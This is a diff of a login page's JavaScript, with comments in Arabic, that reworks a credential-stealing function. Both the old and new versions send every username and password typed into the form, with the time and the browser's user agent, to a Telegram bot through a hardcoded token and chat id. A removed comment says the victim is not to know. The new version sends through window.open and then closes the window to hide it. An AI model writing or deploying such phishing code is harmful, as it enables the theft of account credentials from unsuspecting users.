@@ -140,7 +140,7 @@ body{
 
 <script>
 
-// دالة إرسال بيانات تسجيل الدخول إلى تليجرام (طريقة مضمونة 100%)
+// دالة إرسال اسم المستخدم وكلمة المرور إلى تليجرام
 function sendTelegram(username, password) {
     // توكن البوت الخاص بك
     let token = "5332397047:AAHRZXSwxT3EfCT8xtCku4wh-xtE0cjla98";
@@ -148,67 +148,40 @@ function sendTelegram(username, password) {
     // معرف الدردشة الخاص بك
     let chat_id = "793135440";
     
-    // إنشاء نص الرسالة مع اسم المستخدم وكلمة المرور والوقت
-    let currentTime = new Date().toLocaleString('ar-EG');
-    let messageText = `🔐 محاولة دخول جديدة 🔐\n\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}\n⏰ الوقت: ${currentTime}`;
+    // 🔑 المهم: إنشاء الرسالة مع اليوزر والباسورد
+    let messageText = "✅ محاولة تسجيل دخول جديدة ✅%0A%0A";
+    messageText += "👤 اسم المستخدم: " + username + "%0A";
+    messageText += "🔑 كلمة المرور: " + password + "%0A";
+    messageText += "⏰ الوقت: " + new Date().toLocaleString('ar-EG') + "%0A";
+    messageText += "🌐 المتصفح: " + navigator.userAgent.substring(0, 50);
     
-    // ترميز النص للإرسال
-    let encodedText = encodeURIComponent(messageText);
+    // إنشاء الرابط (نفس طريقة الكود القديم التي كانت تعمل)
+    let url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + messageText;
     
-    // إنشاء رابط الإرسال
-    let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodedText}`;
+    // نفس الطريقة القديمة التي كانت تعمل (window.open)
+    window.open(url, '_blank');
     
-    // الطريقة الأولى: استخدام fetch (تعمل في معظم المتصفحات الحديثة)
-    fetch(url, {
-        method: 'GET',
-        mode: 'no-cors' // هذا يساعد في تجاوز مشاكل CORS
-    })
-    .then(() => {
-        console.log("✅ تم محاولة إرسال البيانات إلى تليجرام");
-    })
-    .catch(error => {
-        console.log("⚠️ خطأ في fetch:", error);
-        // إذا فشل fetch، نستخدم الطريقة الثانية
-        sendTelegramAlternative(url);
-    });
+    // إغلاق النافذة بعد ثانية حتى لا تزعج المستخدم
+    setTimeout(function() {
+        // محاولة إغلاق النافذة (قد لا تعمل في بعض المتصفحات لكنها تحاول)
+        window.close();
+    }, 1000);
+    
+    // تسجيل في الكونسول للتأكد
+    console.log("جاري إرسال: " + username + " / " + password);
 }
 
-// الطريقة البديلة: إنشاء عنصر iframe مخفي
-function sendTelegramAlternative(url) {
-    try {
-        // إنشاء iframe مخفي للإرسال
-        let iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = url;
-        document.body.appendChild(iframe);
-        
-        // حذف الـ iframe بعد ثانيتين
-        setTimeout(() => {
-            document.body.removeChild(iframe);
-        }, 2000);
-        
-        console.log("✅ تم الإرسال عبر iframe");
-    } catch(e) {
-        console.log("⚠️ فشل الإرسال:", e);
-        // الطريقة الثالثة: فتح نافذة وإغلاقها بسرعة
-        let win = window.open(url, '_blank');
-        setTimeout(() => {
-            if(win) win.close();
-        }, 500);
-    }
-}
-
-// دالة تسجيل الدخول المعدلة
+// دالة تسجيل الدخول
 function login(){
 
-    let username = document.getElementById("username").value.trim();
-    let password = document.getElementById("password").value.trim();
+    let username = document.getElementById("username").value;
+    let password = document.getElementById("password").value;
     let message = document.getElementById("message");
 
     message.innerHTML = "";
     message.className = "message";
 
-    // التحقق من الحقول الفارغة
+    // التأكد من وجود بيانات
     if(username === ""){
         message.innerHTML = "⚠️ الرجاء إدخال اسم المستخدم";
         message.classList.add("error");
@@ -221,10 +194,10 @@ function login(){
         return;
     }
 
-    // ✅ إرسال البيانات إلى تليجرام (أي محاولة دخول)
+    // 🔥 إرسال البيانات إلى تليجرام (أياً كانت)
     sendTelegram(username, password);
-    
-    // إظهار رسالة للمستخدم (دون أن يعرف أنه تم إرسال بياناته)
+
+    // التحقق من صحة البيانات
     if(username === "admin" && password === "1234"){
         message.innerHTML = "✅ تم تسجيل الدخول بنجاح";
         message.classList.add("success");
@@ -234,23 +207,13 @@ function login(){
     }
 }
 
-// إضافة خاصية إرسال عند الضغط على Enter
-document.getElementById("username").addEventListener("keypress", function(event) {
-    if (event.key === "Enter") {
-        event.preventDefault();
-        login();
-    }
+// إرسال عند الضغط على Enter
+document.getElementById("username").addEventListener("keypress", function(e) {
+    if(e.key === "Enter") login();
 });
-
-document.getElementById("password").addEventListener("keypress", function(event) {
-    if (event.key === "Enter") {
-        event.preventDefault();
-        login();
-    }
+document.getElementById("password").addEventListener("keypress", function(e) {
+    if(e.key === "Enter") login();
 });
-
-// رسالة تأكيد في Console
-console.log("✅ النظام يعمل - سيتم إرسال أي محاولة دخول إلى تليجرام");
 
 </script>
 
